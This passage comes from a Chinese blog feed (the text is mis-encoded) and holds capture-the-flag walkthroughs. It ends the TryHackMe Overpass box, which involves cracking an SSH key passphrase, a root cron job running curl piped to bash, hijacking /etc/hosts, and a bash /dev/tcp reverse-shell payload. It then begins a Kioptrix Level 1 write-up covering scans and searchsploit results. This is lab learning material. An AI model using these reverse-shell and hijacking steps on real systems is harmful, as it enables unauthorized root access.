class=""><p>ç›´æ¥ç»•è¿‡äº†ç™»é™†æœºåˆ¶ï¼Œæ‹¿åˆ°äº†ç”¨æˆ· james çš„ sshkey</p><pre class=" language-bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiNJHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljTWDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdvBMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZAL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUfABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZkVfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeROkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjzeeaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYnexxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGyAIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0in0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6zylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7-----END RSA PRIVATE KEY-----</code></pre><p>å°† sshkey ä¿å­˜åˆ° id_rsa ä¸­ï¼Œå¹¶ç»™äºˆæƒé™</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 600 id_rsa</code></pre><p>æ¥ç€ä½¿ç”¨ ssh è¿›è¡Œç™»é™†</p><pre class=" language-bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># ssh james@10.10.84.23 -i id_rsa</span>The authenticity of host <span class="token string">'10.10.84.23 (10.10.84.23)'</span> can<span class="token string">'t be established.ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '</span>10.10.84.23<span class="token string">' (ECDSA) to the list of known hosts.Enter passphrase for key '</span>id_rsa':</code></pre><p>æ˜¾ç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œå»ç ´è§£ä¸€ä¸‹</p><pre class=" language-bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># ssh2john id_rsa > hash</span>â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># cat hash</span>id_rsa:<span class="token variable">$sshng</span><span class="token variable">$1</span><span class="token variable">$16</span><span class="token variable">$9F85D92F34F42626F13A7493AB48F337</span><span class="token variable">$1200</span><span class="token variable">$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b</span></code></pre><p>ç„¶åä½¿ç”¨ john è¿›è¡Œçˆ†ç ´</p><pre class=" language-bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                            1 â¨¯</span>Using default input encoding: UTF-8Loaded 1 password <span class="token function">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>RSA/DSA/EC/OPENSSH 32/64<span class="token punctuation">]</span><span class="token punctuation">)</span>Cost 1 <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span>0<span class="token operator">=</span>MD5/AES 1<span class="token operator">=</span>MD5/3DES 2<span class="token operator">=</span>Bcrypt/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is 0 <span class="token keyword">for</span> all loaded hashesCost 2 <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is 1 <span class="token keyword">for</span> all loaded hashesWill run 2 OpenMP threadsPress <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> statusjames13          <span class="token punctuation">(</span>id_rsa<span class="token punctuation">)</span>1g 0:00:00:00 DONE <span class="token punctuation">(</span>2022-05-05 20:27<span class="token punctuation">)</span> 12.50g/s 167200p/s 167200c/s 167200C/s lisa<span class="token punctuation">..</span>honoluluUse the <span class="token string">"--show"</span> option to display all of the cracked passwords reliablySession completed.</code></pre><p>è¿™é‡Œçˆ†ç ´å‡ºæ¥äº†å¯†ç ä¸º james13 å»å°±è¿›è¡Œè¿æ¥</p><pre class=" language-bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># ssh james@10.10.84.23 -i id_rsa</span>Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_rsa'</span><span class="token keyword">:</span>Welcome to Ubuntu 18.04.4 LTS <span class="token punctuation">(</span>GNU/Linux 4.15.0-108-generic x86_64<span class="token punctuation">)</span> * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Thu May  5 12:32:51 UTC 2022  System load:  0.09               Processes:           92  Usage of /:   22.3% of 18.57GB   Users logged in:     0  Memory usage: 12%                IP address <span class="token keyword">for</span> eth0: 10.10.84.23  Swap usage:   0%47 packages can be updated.0 updates are security updates.Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1james@overpass-prod:~$ <span class="token function">whoami</span><span class="token operator">&amp;&amp;</span><span class="token function">id</span>jamesuid<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span> gid<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span> groups<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span></code></pre><p>æˆåŠŸæ‹¿åˆ° user æƒé™</p><pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">ls</span>todo.txt  user.txtjames@overpass-prod:~$ <span class="token function">cat</span> user.txtthm<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;65c1aaf000506e56996822c6281e6bf7&amp;#125;</span></code></pre><p>æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶</p><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">cat</span> todo.txtTo Do:<span class="token operator">></span> Update Overpass<span class="token string">' Encryption, Muirland has been complaining that it'</span>s not strong enough<span class="token operator">></span> Write down my password somewhere on a sticky note so that I don<span class="token string">'t forget it.  Wait, we make a password manager. Why don'</span>t I just use that?<span class="token operator">></span> Test Overpass <span class="token keyword">for</span> macOS, it builds fine but I<span class="token string">'m not sure it actually works> Ask Paradox how he got the automated build script working and where the builds go.  They'</span>re not updating on the website</code></pre><p>è¿™æœ‰ä¸ª todo.txt æ–‡ä»¶ä½œä¸ºæç¤ºï¼Œä¸è¿‡æˆ‘è‹±è¯­ä¸å¥½ï¼Œä¹Ÿä¸ç¡®å®šè¯´çš„å•¥ï¼Œè¿˜æ˜¯å…ˆè·‘ä¸ª LinPeas çœ‹çœ‹å§</p><pre class=" language-bash"><code class="language-bash">SHELL<span class="token operator">=</span>/bin/shPATH<span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin17 *    * * *   root    <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.hourly25 6    * * *   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="token punctuation">)</span>47 6    * * 7   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="token punctuation">)</span>52 6    1 * *   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="token punctuation">)</span>* * * * * root curl overpass.thm/downloads/src/buildscript.sh <span class="token operator">|</span> <span class="token function">bash</span></code></pre><p>è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªï¼Œroot ä¼šä½¿ç”¨ curl å‘ overpass.htm&#x2F;downloads&#x2F;src&#x2F;buildscrit.sh è¯·æ±‚å†…å®¹ï¼Œç„¶åä½¿ç”¨ bash æ‰§è¡Œ</p><pre class=" language-bash"><code class="language-bash">â•”â•â•â•â•â•â•â•â•â•â•â•£ Hostname, hosts and DNSoverpass-prod127.0.0.1 localhost127.0.1.1 overpass-prod127.0.0.1 overpass.thm::1     ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allroutersnameserver 127.0.0.53options edns0search eu-west-1.compute.internal</code></pre><p>ç„¶ååœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ° overpass.htm æ˜¯æŒ‡å‘çš„ 127.0.0.1</p><pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">ls</span> -la /etc/hosts-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts</code></pre><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ˜¯æœ‰æƒé™ä¿®æ”¹ &#x2F;etc&#x2F;hosts çš„å†…å®¹çš„</p><p>é‚£ææƒæ€è·¯å°±æœ‰äº†</p><p>é¦–å…ˆåˆ›å»ºæŒ‡å®šçš„ç›®å½•å’Œè„šæœ¬</p><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p downloads/src <span class="token operator">&amp;&amp;</span> vim downloads/src/buildscript.sh</code></pre><p>ç„¶åå†™å…¥æˆ‘ä»¬çš„ payload</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">'exec bash -i &amp;>/dev/tcp/10.18.112.117/4444 &lt;&amp;1'</span></code></pre><p>æ¥ç€éœ€è¦ä¸¤ä¸ªçª—å£</p><p>ç¬¬ä¸€ä¸ªçª—å£ ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£</p><pre class=" language-bash"><code class="language-bash">nc -nvlp 4444</code></pre><p>ç¬¬äºŒä¸ªçª—å£ ä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡</p><pre class=" language-bash"><code class="language-bash">python3 -m http.server 80</code></pre><p>ç„¶åå» shell é‡Œä¿®æ”¹ &#x2F;etc&#x2F;hosts çš„å†…å®¹</p><pre class=" language-bash"><code class="language-bash">10.18.112.117 overpass.thm</code></pre><p>æŠŠç¬¬ä¸‰è¡Œæ”¹æˆè¿™æ ·ï¼Œç„¶åç­‰ç€å°±è¡Œäº†</p><pre class=" language-bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># python3 -m http.server 80  </span>Serving HTTP on 0.0.0.0 port 80 <span class="token punctuation">(</span>http://0.0.0.0:80/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.10.10.84.23 - - <span class="token punctuation">[</span>05/May/2022 09:17:01<span class="token punctuation">]</span> <span class="token string">"GET /downloads/src/buildscript.sh HTTP/1.1"</span> 200 -</code></pre><p>æˆåŠŸä¸‹è½½äº†æˆ‘ä»¬çš„ payload</p><pre class=" language-bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>â””â”€<span class="token comment" spellcheck="true"># nc -nvlp 4444</span>listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.connect to <span class="token punctuation">[</span>10.18.112.117<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>10.10.84.23<span class="token punctuation">]</span> 43604bash: cannot <span class="token keyword">set</span> terminal process group <span class="token punctuation">(</span>16146<span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> devicebash: no job control <span class="token keyword">in</span> this shellroot@overpass-prod:~<span class="token comment" spellcheck="true"># whoami&amp;&amp;id</span><span class="token function">whoami</span><span class="token operator">&amp;&amp;</span><span class="token function">id</span>                                                                                                                                    root                                                                                                                                          uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre><p>æˆåŠŸæ‹¿åˆ°äº† root æƒé™</p><pre class=" language-bash"><code class="language-bash">root@overpass-prod:~<span class="token comment" spellcheck="true"># ls                                                                                                                      </span><span class="token function">ls</span>                                                                                                                                            buildStatus                                                                                                                                   builds                                                                                                                                        downloads                                                                                                                                     go                                                                                                                                            root.txt                                                                                                                                      src                                                                                                                                           root@overpass-prod:~<span class="token comment" spellcheck="true"># cat root.txt                                                                                                            </span><span class="token function">cat</span> root.txt                                                                                                                                  thm<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;7f336f8c359dbac18d54fdd64ea753bb&amp;#125;</span></code></pre><p>æˆåŠŸæ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶</p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Kioptrix Level 1 é¶åœºå®æˆ˜</title>
      <link href="/2021/11/13/Kioptrix/"/>
      <url>/2021/11/13/Kioptrix/</url>
      
        <content type="html"><![CDATA[<h2 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h2><pre><code>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.è¿™ä¸ªKioptrix VM Imageæ˜¯å¾ˆå®¹æ˜“çš„æŒ‘æˆ˜ã€‚æ¸¸æˆçš„ç›®çš„æ˜¯é€šè¿‡ä»»ä½•å¯èƒ½çš„æ‰‹æ®µè·å¾—rootæƒé™ï¼ˆé™¤äº†å®é™…å…¥ä¾µVMæœåŠ¡å™¨æˆ–ç©å®¶ï¼‰ã€‚è¿™äº›æ¸¸æˆçš„ç›®çš„æ˜¯å­¦ä¹ æ¼æ´è¯„ä¼°å’Œåˆ©ç”¨æ–¹é¢çš„åŸºæœ¬å·¥å…·å’ŒæŠ€æœ¯ã€‚æˆåŠŸå®Œæˆè¿™äº›æŒ‘æˆ˜çš„æ–¹æ³•æœ‰å¾ˆå¤šã€‚</code></pre><pre><code>ä¸‹è½½åœ°å€https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</code></pre><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é¦–å…ˆä½¿ç”¨arpè·å–é¶æœºçš„IPåœ°å€</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.1.102   00:0c:29:55:cb:15       VMware, Inc.9 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded</code></pre><p>ç¡®å®šé¶æœºIPåœ°å€ä¸º192.168.1.102ï¼Œä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 ESTNmap scan report for 192.168.1.102Host is up (0.00042s latency).Not shown: 65529 closed portsPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)| ssh-hostkey:|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)|_sshv1: Server supports SSHv180/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: Test Page for the Apache Web Server on Red Hat Linux111/tcp  open  rpcbind     2 (RPC #100000)| rpcinfo:|   program version    port/proto  service|   100000  2            111/tcp   rpcbind|   100000  2            111/udp   rpcbind|   100024  1           1024/tcp   status|_  100024  1           1024/udp   status139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: 400 Bad Request| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--| Not valid before: 2009-09-26T09:32:06|_Not valid after:  2010-09-26T09:32:06|_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time.| sslv2:|   SSLv2 supported|   ciphers:|     SSL2_RC2_128_CBC_WITH_MD5|     SSL2_RC4_128_WITH_MD5|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5|     SSL2_RC4_64_WITH_MD5|     SSL2_RC4_128_EXPORT40_WITH_MD5|     SSL2_DES_192_EDE3_CBC_WITH_MD5|_    SSL2_DES_64_CBC_WITH_MD51024/tcp open  status      1 (RPC #100024)MAC Address: 00:0C:29:55:CB:15 (VMware)Device type: general purposeRunning: Linux 2.4.XOS CPE: cpe:/o:linux:linux_kernel:2.4OS details: Linux 2.4.9 - 2.4.18 (likely embedded)Network Distance: 1 hopHost script results:|_clock-skew: 1h01m54s|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)|_smb2-time: Protocol negotiation failed (SMB2)TRACEROUTEHOP RTT     ADDRESS1   0.42 ms 192.168.1.102OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 69.83 seconds</code></pre><p>è¿™ä¸œè¥¿ç¨å¾®çš„æœ‰ç‚¹å¤šï¼Œä¸€ä¸ªä¸ªçœ‹</p><img src="/2021/11/13/Kioptrix/image1.png" class=""><p>80ç«¯å£å¥½åƒä¹Ÿæ²¡å•¥å¯çœ‹çš„ï¼Ÿæ‰«ä¸ªç›®å½•çœ‹çœ‹å§</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://192.168.1.102/[+] Method:                  GET[+] Threads:                 200[+] Wordlist:                /usr/share/dirb/wordlists/common.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              php[+] Expanded:                true[+] Timeout:                 10s===============================================================2021/11/12 07:52:42 Starting gobuster in directory enumeration mode===============================================================http://192.168.1.102/.htaccess            (Status: 403) [Size: 273]http://192.168.1.102/.htpasswd            (Status: 403) [Size: 273]http://192.168.1.102/.hta                 (Status: 403) [Size: 268]http://192.168.1.102/.htaccess.php        (Status: 403) [Size: 277]http://192.168.1.102/.htpasswd.php        (Status: 403) [Size: 277]http://192.168.1.102/.hta.php             (Status: 403) [Size: 272]http://192.168.1.102/~root                (Status: 403) [Size: 269]http://192.168.1.102/~operator            (Status: 403) [Size: 273]http://192.168.1.102/cgi-bin/             (Status: 403) [Size: 272]http://192.168.1.102/index.html           (Status: 200) [Size: 2890]http://192.168.1.102/manual               (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/]http://192.168.1.102/mrtg                 (Status: 301) [Size: 292] [--&gt; http://127.0.0.1/mrtg/]http://192.168.1.102/usage                (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/]http://192.168.1.102/test.php             (Status: 200) [Size: 27]</code></pre><p>æŒ¨ä¸ªå»çœ‹çœ‹</p><img src="/2021/11/13/Kioptrix/image2.png" class=""><p>å‡ ä¸ªé¡µé¢éƒ½ä¼šè·³è½¬åˆ°127.0.0.1ï¼Œåªæœ‰test.phpå¯ä»¥è®¿é—®ï¼Œè€Œä¸”è¿˜æ²¡ä»€ä¹ˆä¸œè¥¿</p><p>ç»§ç»­å›åˆ°ç«¯å£çœ‹çœ‹å§</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# smbclient -L 192.168.1.102                                                                                                            1 â¨¯protocol negotiation failed: NT_STATUS_IO_TIMEOUT</code></pre><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>çœ‹åˆ°80ç«¯å£åé¢çš„mod_ssl&#x2F;2.8.4ï¼Œå»æœä¸€ä¸‹æœ‰æ²¡æœ‰Exploit</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# searchsploit mod_ssl------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title                                                                                              |  Path------------------------------------------------------------------------------------------------------------ ---------------------------------Apache mod_ssl 2.0.x - Remote Denial of Service                                                             | linux/dos/24590.txtApache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                  | multiple/dos/21575.txtApache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow                                        | unix/remote/21671.cApache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1)                                  | unix/remote/764.cApache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (2)                                  | unix/remote/47080.cApache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &#39;openssl-too-open.c&#39; SSL2 KEY_ARG Overflow                | unix/remote/40347.txt------------------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No Results</code></pre><p>å¯¹æ¯”mod_ssl&#x2F;2.8.4ç‰ˆæœ¬ï¼Œæœ‰ä¸‰ä¸ªç‰ˆæœ¬åˆé€‚ï¼ŒæŒ¨ä¸ªè¿›è¡Œæµ‹è¯•</p><p>ç»è¿‡æµ‹è¯•å‘ç°unix&#x2F;remote&#x2F;47080.cæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå’±ä»¬ç»™ä»–å¤åˆ¶å‡ºæ¥</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# locate unix/remote/47080.c/usr/share/exploitdb/exploits/unix/remote/47080.câ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# cp 